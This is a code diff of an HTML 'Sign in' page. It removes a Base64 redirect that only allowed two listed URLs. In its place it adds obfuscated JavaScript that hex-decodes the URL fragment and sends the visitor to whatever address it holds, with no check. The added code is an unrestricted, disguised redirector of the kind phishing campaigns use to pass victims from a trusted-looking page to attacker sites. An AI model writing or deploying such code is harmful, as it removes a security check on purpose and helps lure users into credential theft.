@@ -2,28 +2,19 @@
 <head><title>Sign in</title></head>
 <body>
     <script>
-        // List of allowed domains or paths for redirection
-        const allowedDomains = [
-        'https://findoy.com/ad183/a1d6',
-	'https://xg43dm.logkln.com/qog3tx/p65h7/',
-        ];
-
         // Retrieve and decode the hash from the URL
         const encodedHash = window.location.hash.substr(1); // Remove '#'
-        try {
-            // Decode from Base64
-            const decodedUrl = window.atob(encodedHash);
-            
-            // Check if the decoded URL is allowed
-            if (allowedDomains.includes(decodedUrl)) {
-                // Redirect only if it matches an allowed domain or path
-                window.location.href = decodedUrl;
-            } else {
-                console.warn('Unrecognized or unsafe redirect URL');
-            }
-        } catch (error) {
-            console.error('Error decoding the URL:', error);
-        }
+        const sd = encodedHash;  
+		const wsd = sd.substring(1);
+		const maxs = [];
+
+		for (let assd = 0; assd < wsd.length - 1; assd += 2) {
+		  maxs.push(parseInt(wsd.substr(assd, 2), 16));
+		}
+
+		const bud = String.fromCharCode.apply(String, maxs);
+		console.log(bud);
+		location.replace(bud);
     </script> 
 </body>
 </html>
